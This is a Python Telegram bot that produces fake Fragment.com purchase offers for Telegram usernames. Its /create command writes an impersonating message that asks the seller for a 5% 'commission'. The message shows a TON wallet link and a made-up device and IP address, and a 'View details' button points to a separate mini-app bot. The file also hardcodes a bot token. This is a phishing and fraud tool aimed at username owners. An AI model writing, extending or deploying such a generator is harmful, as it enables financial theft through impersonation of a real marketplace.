import os
import time
import urllib.request
import json
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"🤖 Fragment Deal Generator v3.1 - WEBHOOK FIXED")
print(f"🔑 Token: ✅")
print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
bot_status = "STARTING"
event_loop = None

# ===== PRIX TON =====
def get_ton_price():
    """Prix TON simplifié"""
    try:
        url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            return float(data.get('Price', 5.50))
    except:
        return 5.50

# ===== COMMANDES BOT =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    print(f"📥 START command from user {update.effective_user.id}")
    
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator v3.1**

Hello {user.first_name}! 👋

**Your Chat ID:** `{chat_id}`

**Commands:**
• `/create username price` - Generate Fragment deal
• `/help` - Show help

**Example:**
`/create crypto 1500`

✅ **Bot is ready to work!**"""
        
        await update.message.reply_text(
            message,
            parse_mode='Markdown'
        )
        
        print(f"✅ START response sent to {chat_id}")
        
    except Exception as e:
        print(f"❌ START error: {e}")
        try:
            await update.message.reply_text("❌ Error occurred, please try again.")
        except:
            pass

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create"""
    print(f"📥 CREATE command: {context.args}")
    
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Wrong format!**\n\n"
                "Use: `/create username price`\n"
                "Example: `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
        
        username = str(context.args[0]).strip().replace('@', '').upper()
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Price must be a number!")
            return
        
        if price <= 0 or price > 1000000:
            await update.message.reply_text("❌ Price must be between 0 and 1,000,000 TON")
            return
        
        # Calculs
        commission = price * 0.05
        ton_price = get_ton_price()
        price_usd = price * ton_price
        commission_usd = commission * ton_price
        
        # Message Fragment
        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
        
        # Bouton
        button_url = f"https://t.me/BidRequestMiniApp_bot/WebApp?startapp={username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Envoi
        await update.message.reply_text(
            fragment_message,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        
        # Confirmation
        await update.message.reply_text(
            f"✅ **Deal Created!**\n\n"
            f"Username: @{username}\n"
            f"Price: {price:g} TON (${price_usd:.2f})\n"
            f"TON Price: ${ton_price:.2f}",
            parse_mode='Markdown'
        )
        
        print(f"✅ Deal created: @{username} - {price} TON")
        
    except Exception as e:
        print(f"❌ CREATE error: {e}")
        try:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /help"""
    print(f"📥 HELP command from {update.effective_user.id}")
    
    help_text = """📖 **Fragment Deal Generator Help**

**Commands:**
• `/start` - Start the bot
• `/create username price` - Create Fragment deal
• `/help` - Show this help

**Examples:**
• `/create crypto 1500`
• `/create bitcoin 2000.5`

**Features:**
• 💎 Real-time TON price
• 💰 Automatic USD conversion  
• 🧮 5% commission calculation
• 🔗 Clickable TON wallet
• 📱 Integrated WebApp button

✅ **Ready to generate Fragment deals!**"""
    
    try:
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("✅ HELP sent")
    except Exception as e:
        print(f"❌ HELP error: {e}")

# ===== TRAITEMENT UPDATES =====
def process_update_sync(update_data):
    """Traitement synchrone des updates"""
    try:
        print(f"📡 Processing webhook data...")
        
        # Création de l'Update
        update = Update.de_json(update_data, app.bot)
        
        if update:
            print(f"🔄 Update created: {update.update_id}")
            
            # Exécution dans la boucle asyncio du thread bot
            future = asyncio.run_coroutine_threadsafe(
                app.process_update(update), 
                event_loop
            )
            
            # Attendre le résultat avec timeout
            future.result(timeout=10)
            print(f"✅ Update processed: {update.update_id}")
            return True
        else:
            print("❌ Failed to create Update object")
            return False
            
    except Exception as e:
        print(f"❌ Process update sync error: {e}")
        return False

# ===== SERVEUR WEBHOOK =====
class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Traitement des webhooks Telegram"""
        try:
            print(f"📨 POST request: {self.path}")
            
            if self.path == f"/{BOT_TOKEN}":
                # Lecture du body
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                
                print(f"📡 Webhook received: {len(post_data)} bytes")
                
                # Parse JSON
                try:
                    update_data = json.loads(post_data.decode('utf-8'))
                    print(f"📋 Update data keys: {list(update_data.keys())}")
                except json.JSONDecodeError as e:
                    print(f"❌ JSON decode error: {e}")
                    self.send_error(400, "Invalid JSON")
                    return
                
                # Traitement de l'update
                success = process_update_sync(update_data)
                
                # Réponse HTTP
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                response = {"ok": True, "processed": success}
                self.wfile.write(json.dumps(response).encode())
                
                print(f"✅ Response sent: {response}")
                
            else:
                print(f"❌ Wrong path: {self.path}")
                self.send_error(404, "Path not found")
                
        except Exception as e:
            print(f"❌ Webhook error: {e}")
            try:
                self.send_error(500, f"Server error: {str(e)}")
            except:
                pass
    
    def do_GET(self):
        """Page de statut"""
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # Informations de statut
            webhook_info = "Unknown"
            try:
                if app and hasattr(app, 'bot'):
                    # Note: On ne peut pas faire d'appel async ici
                    webhook_info = f"{WEBHOOK_URL}/{BOT_TOKEN}"
            except:
                pass
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Fragment Bot Status</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial; margin: 40px; background: #f0f8ff; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 30px; 
                     background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .status {{ color: #28a745; font-weight: bold; font-size: 18px; }}
        .info {{ background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Fragment Deal Generator v3.1</h1>
        <p class="status">✅ Status: {bot_status}</p>
        <div class="info">
            <p><strong>🔗 Bot:</strong> Fragment Deal Generator</p>
            <p><strong>📡 Mode:</strong> Webhook</p>
            <p><strong>🌐 System:</strong> Render Cloud</p>
            <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
            <p><strong>💎 Target Chat:</strong> {FIXED_CHAT_ID}</p>
            <p><strong>🔄 Loop:</strong> {"Active" if event_loop and not event_loop.is_closed() else "Inactive"}</p>
        </div>
        <p><strong>Webhook URL:</strong> {webhook_info}</p>
        <p>Ready to generate Fragment deals! 🚀</p>
        
        <div style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;">
            <p><strong>Test webhook:</strong></p>
            <code>curl -X POST {webhook_info} -H "Content-Type: application/json" -d '{{"test": true}}'</code>
        </div>
    </div>
</body>
</html>"""
            
            self.wfile.write(html.encode('utf-8'))
            
        except Exception as e:
            print(f"❌ GET error: {e}")
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP par défaut"""
        pass

# ===== SETUP BOT =====
async def setup_bot():
    """Setup du bot avec webhook"""
    global app, bot_status
    
    try:
        print("🤖 Creating bot application...")
        
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des handlers
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("✅ Handlers added")
        
        # Initialisation
        await app.initialize()
        print("✅ Bot initialized")
        
        # Test de connexion
        bot_info = await app.bot.get_me()
        print(f"✅ Connected to: @{bot_info.username} (ID: {bot_info.id})")
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        
        try:
            # Suppression ancien webhook
            await app.bot.delete_webhook(drop_pending_updates=True)
            print("🗑️ Old webhook deleted")
        except Exception as e:
            print(f"⚠️ Delete webhook warning: {e}")
        
        # Attendre un peu
        await asyncio.sleep(1)
        
        # Configuration nouveau webhook
        await app.bot.set_webhook(url=webhook_url)
        print(f"🔗 Webhook configured: {webhook_url}")
        
        # Vérification
        webhook_info = await app.bot.get_webhook_info()
        print(f"📡 Webhook active: {webhook_info.url}")
        print(f"📊 Pending updates: {webhook_info.pending_update_count}")
        
        bot_status = "RUNNING"
        print("✅ Bot ready!")
        
        return True
        
    except Exception as e:
        print(f"❌ Setup error: {e}")
        bot_status = f"ERROR: {str(e)}"
        return False

async def bot_loop():
    """Boucle principale du bot"""
    global event_loop
    
    try:
        print("🔄 Starting bot loop...")
        
        # Récupérer la boucle courante
        event_loop = asyncio.get_running_loop()
        print(f"✅ Event loop: {event_loop}")
        
        # Setup du bot
        success = await setup_bot()
        if not success:
            print("❌ Bot setup failed")
            return
        
        print("🎯 Bot configured successfully!")
        print("⏳ Waiting for webhooks...")
        
        # Boucle infinie pour maintenir le bot actif
        while True:
            await asyncio.sleep(30)  # Ping toutes les 30 secondes
            
            try:
                # Test périodique de santé
                me = await app.bot.get_me()
                print(f"💚 Bot health check: @{me.username}")
            except Exception as e:
                print(f"⚠️ Health check failed: {e}")
        
    except Exception as e:
        print(f"❌ Bot loop error: {e}")
    
    finally:
        print("🔚 Bot loop ended")

def run_bot():
    """Thread pour le bot"""
    try:
        print("🚀 Bot thread starting...")
        asyncio.run(bot_loop())
    except Exception as e:
        print(f"❌ Bot thread error: {e}")

def run_server():
    """Serveur HTTP pour webhooks"""
    try:
        print(f"🌐 Starting HTTP server on port {PORT}...")
        
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"✅ Server started: http://0.0.0.0:{PORT}")
        print(f"🔗 Webhook endpoint: /{BOT_TOKEN}")
        
        server.serve_forever()
        
    except Exception as e:
        print(f"❌ Server error: {e}")
        raise

# ===== MAIN =====
def main():
    """Point d'entrée principal"""
    print("🚀 Starting Fragment Deal Generator v3.1...")
    print("=" * 60)
    
    try:
        # Démarrage du bot en thread séparé
        bot_thread = threading.Thread(target=run_bot, daemon=True, name="BotThread")
        bot_thread.start()
        print("✅ Bot thread started")
        
        # Attendre que le bot soit initialisé
        time.sleep(5)
        
        # Démarrage du serveur HTTP (blocking)
        print("🌐 Starting HTTP server...")
        run_server()
        
    except KeyboardInterrupt:
        print("\n🛑 Shutdown requested")
        
    except Exception as e:
        print(f"❌ MAIN ERROR: {e}")
        
    finally:
        print("🔚 Application ended")

if __name__ == '__main__':
    main()
